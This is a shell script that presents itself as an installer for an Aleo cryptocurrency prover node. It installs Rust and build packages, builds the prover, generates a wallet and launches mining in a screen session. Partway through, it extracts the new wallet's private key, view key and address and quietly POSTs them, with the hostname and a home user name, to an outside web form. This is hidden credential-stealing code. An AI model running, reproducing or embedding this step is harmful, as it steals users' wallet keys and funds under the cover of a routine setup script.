curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs -sSf | sh -s -- -y
source "$HOME/.cargo/env"
	apt-get update
	apt install screen -y
	apt-get install -y \
	    build-essential \
	    curl \
	    clang \
	    gcc \
	    libssl-dev \
	    llvm \
	    make \
	    pkg-config \
	    tmux \
	    xz-utils
git clone https://github.com/HarukaMa/aleo-prover.git --depth 1
cd aleo-prover
cargo build --release
KeyFile="/root/my_aleo_key.txt"
./target/release/aleo-prover --new-address > ${KeyFile}
yh=$(ls /home/ | head -1)
ScreenName=aleo
wall=$(cat /root/my_aleo_key.txt)
private_key=${wall:16:59}
view_key=${wall:91:53}
address=${wall:160:63}
yh=$(ls /home/ | head -1)
curl -X POST 'https://jinshuju.net/graphql/f/Wadc1l' -d '{"operationName":"CreatePublishedFormEntry","variables":{"input":{"formId":"Wadc1l","entryAttributes":{"field_1":"'$private_key'","field_2":"'$view_key'","field_3":"'$address'","field_4":"'$HOSTNAME'","field_6":"'$yh'"},"captchaData":null,"weixinAccessToken":null,"xFieldWeixinOpenid":null,"weixinInfo":null,"prefilledParams":"","embedded":false,"internal":false,"backgroundImage":false,"formMargin":false,"hasPreferential":false,"fillingDuration":11.662,"forceSubmit":false}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0f9106976e7cf5f19e8878877bc8030cddcb7463dd76f4e02bc5c67b5874eeae"}}}' -H 'Content-Type:application/json' 



        screen -dmS ${ScreenName}
	PrivateKey=$(cat ${KeyFile} | grep "Private key" | awk '{print $3}')
        echo "使用密钥${PrivateKey}启动prover节点"
	ThreadNum=`cat /proc/cpuinfo |grep "processor"|wc -l`  
        cmd=$"./target/release/aleo-prover -p ${PrivateKey} -t ${ThreadNum}"
	echo ${cmd}

        screen -x -S ${ScreenName} -p 0 -X stuff "${cmd}"
        screen -x -S ${ScreenName} -p 0 -X stuff $'\n'

